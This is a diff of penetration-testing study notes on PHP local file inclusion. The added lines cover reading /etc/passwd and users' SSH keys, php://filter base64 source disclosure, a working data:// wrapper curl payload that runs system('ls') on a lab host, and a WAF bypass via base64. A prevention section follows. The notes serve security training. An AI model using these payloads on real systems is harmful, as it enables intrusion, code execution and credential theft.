@@ -149,6 +149,9 @@ So, you can sue this trick to go back several directories until you reach the ro
 
 As you can see, this time you were able to read the file regardless of the directory you were in. This trick would work even if the entire parameter was used in the ```include()``` function, so you can default to this technique, and it should work in both cases. Furthermore, if you were at the root path and used ```../``` then you would still remain in the root path. So, if you were not sure if the directory the app is in, you can add ```../``` many times, and it should not break the path.
 
+> [!INFO]
+> In general, it is more difficult to leverage a directory traversal vuln for system access on Windows than Linux. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of `/etc/passwd`, check for private SSH keys in their home directory, and use them to access the system via SSH. This vector is not available on Windows and unfortunately, there is no direct equivalent.
+
 #### Filename Prefix
 
 In the previous example, you used the ```language``` parameter after the directory, so you could traverse the path to read the ```passwd```. On some occasions, you input may be appended after a different string. For example, it may be used with a prefix to get the full filename:
@@ -359,6 +362,11 @@ d41y@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/
 <p class="read-more">
 ```
 
+> [!INFO]
+> Getting the Base64 encoded string helps when you don't want to have the PHP code inside a file executed but readable. Both, a regular LFI and using plain `php://filter`, won't help. You'll have to use some type of encoding.
+> 
+> `php://filter/convert.base64-encode/resource=...`
+
 Once you have the base64 encoded string, you can decode it and grep for ```allow_url_include``` to see its value:
 
 ```bash
@@ -371,7 +379,30 @@ You see that you have this option enabled, so you can use the ```data``` wrapper
 
 ##### Remote Code Execution
 
-With ```allow_url_include``` enabled, you can proceed with your ```data``` wrapper attack. As mentioned earlier, the ```data``` wrapper can be used to include external data, including PHP code. You can also pass it base64 encoded strings with ```text/plain;base64```, and it has the ability to decode them and execute the PHP code.
+With ```allow_url_include``` enabled, you can proceed with your ```data``` wrapper attack. As mentioned earlier, the ```data``` wrapper can be used to include external data, including PHP code. You can also pass it base64 encoded strings with ```text/plain;base64```, and it has the ability to decode them and execute the PHP code (_in the running web application's code_).
+
+> [!INFO]
+> `data://text/plain,...` for plain text (_PHP snippet has to be URL-encoded_).
+> 
+> `data://text/plain;base64,...` for Base64 encoded text.
+
+```bash
+kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+...
+```
+
+The embedded data was successfully executed.
+
+When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such scenario, you can try to use the `data://` wrapper with base64-encoded data.
 
 So, your first step would be to base64 encode a basic PHP web shell:
 
@@ -900,15 +931,15 @@ As you can see, the ```APACHE_LOG_DIR``` variable is set to ```/var/log/apache2`
 
 Finally, you can utilize a number of LFI tools to automate much of the process, which may save some time in some cases, but may also miss many vulnerabilities and files you may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). You can also search GitHub for various other LFI tools and scripts.
 
-### Prevention
+## Prevention
 
-#### File Inclusion Prevention
+### File Inclusion Prevention
 
 The most effective thing you can do to reduce file inclusion vulns is to avoid passing any user-controlled inputs into any file inclusion function or APIs. The page should be able to dynamically load assets on the back-end, with no user interaction whatsoever. Furthermore, whenever one of the above potentially vulnerable functions is used, you should ensure that no user input is directly going into them. You should therefore generally consider any function that can read files. In some cases, this may not be feasible, as it may require changing the whole architecture of an existing web app. In such cases, you should utilize a limited whitelist of allowed user inputs, and match each input to the file to be loaded, while having a default value for all other inputs. If you are dealing with an existing app, you can create a whitelist that contains all existing paths in the front-end, and then utilize this list to match the user input. Such a whitelist can have many can have many shapes, like a database table that matches IDs to files, a case-match script that matches names to files, or even a static json map with names and files that can be matched.
 
 Once this is implemented, the user input is not going into the function, but the matched files are used in the function, which avoids file inclusion vulns.
 
-#### Preventing Directory Traversal
+### Preventing Directory Traversal
 
 If attackers can control the directory, they can escape the web app and attack something they are more familiar with or use an universal attack chain.
 
